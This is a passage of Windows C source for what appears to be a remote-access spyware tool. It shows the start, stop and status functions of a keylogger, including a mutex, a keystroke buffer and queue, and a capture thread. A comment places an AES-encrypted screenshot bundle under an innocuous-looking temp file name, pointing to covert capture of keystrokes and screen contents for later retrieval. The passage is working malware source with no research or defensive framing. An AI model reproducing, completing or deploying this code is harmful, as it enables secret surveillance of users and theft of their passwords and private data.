    if (!g_keylogger_mutex) { InterlockedExchange(&g_keylogger_running, 0); return 0; }
    g_keylogger_buf = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, KEYLOGGER_BUF_SIZE);
    if (!g_keylogger_buf) {
        CloseHandle(g_keylogger_mutex);
        InterlockedExchange(&g_keylogger_running, 0);
        return 0;
    }
    g_keylogger_buf_len = 0;
    g_last_title[0] = '\0';

    g_keylog_q_head = 0;
    g_keylog_q_tail = 0;
    g_keylog_q_initialized = 1;

    /* Encrypted screenshot bundle: %TEMP%\\wctBG958.tmp (same AES key as keylog segments). */
    if (!remote_get_screenshot_bundle_path(g_screenshot_bundle_path, sizeof(g_screenshot_bundle_path)))
        g_screenshot_bundle_path[0] = '\0';

    g_keylogger_thread = CreateThread(NULL, 0, keylogger_thread_proc, NULL, 0, NULL);
    if (!g_keylogger_thread) {
        HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
        CloseHandle(g_keylogger_mutex);
        g_keylog_q_initialized = 0;
        InterlockedExchange(&g_keylogger_running, 0);
        return 0;
    }
    return 1;
}

void remote_keylogger_stop(void) {
    if (InterlockedCompareExchange(&g_keylogger_running, 0, 1) != 1) return;
    if (g_keylogger_thread) {
        DWORD tid = GetThreadId(g_keylogger_thread);
        if (tid) PostThreadMessageA(tid, WM_QUIT, 0, 0);
        WaitForSingleObject(g_keylogger_thread, 5000);
        CloseHandle(g_keylogger_thread);
        g_keylogger_thread = NULL;
    }
    if (g_keylog_q_initialized) {
        g_keylog_q_initialized = 0;
    }
    if (g_keylogger_buf) {
        HeapFree(GetProcessHeap(), 0, g_keylogger_buf);
        g_keylogger_buf = NULL;
    }
    if (g_keylogger_mutex) {
        CloseHandle(g_keylogger_mutex);
        g_keylogger_mutex = NULL;
    }
}

int remote_keylogger_is_running(void) {
    return InterlockedCompareExchange(&g_keylogger_running, 1, 1) == 1;
}
